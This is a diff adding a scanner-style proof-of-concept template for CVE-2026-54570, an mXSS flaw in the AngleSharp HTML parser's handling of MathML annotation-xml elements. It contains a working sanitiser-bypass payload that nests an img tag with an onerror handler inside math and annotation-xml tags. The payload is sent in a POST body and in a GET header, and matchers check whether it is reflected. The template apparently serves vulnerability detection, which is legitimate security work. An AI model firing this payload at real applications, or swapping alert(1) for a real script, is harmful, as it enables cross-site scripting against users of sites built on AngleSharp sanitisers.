@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = 'AngleSharp HTML解析器在处理MathML annotation-xml元素时未正确设置HtmlTip标志，导致annotation-xml encoding="text/html"内的内容被当作MathML而非HTML解析。同时HtmlMarkupFormatter.WriteAttributeValue()在序列化属性值时未转义<和>字符。攻击者可构造特制MathML载荷绕过基于AngleSharp的HTML清理器，触发XSS。'
+id = "POC-AVE-2026-0578"
+name = "AngleSharp annotation-xml HTML Integration Point Bypass mXSS PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54570",
+    "mxss",
+    "anglesharp",
+    "html-parser",
+]
+vuln_id = [
+    "CVE-2026-54570",
+    "AVE-2026-0578",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '<math><annotation-xml encoding="text/html"><title><a encoding="</title><img src=x onerror=alert(1)>"></annotation-xml></math>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/plain"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.headers]
+X-Payload = '<math><annotation-xml encoding="text/html"><title><a encoding="</title><img src=x onerror=alert(1)>"></annotation-xml></math>'
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
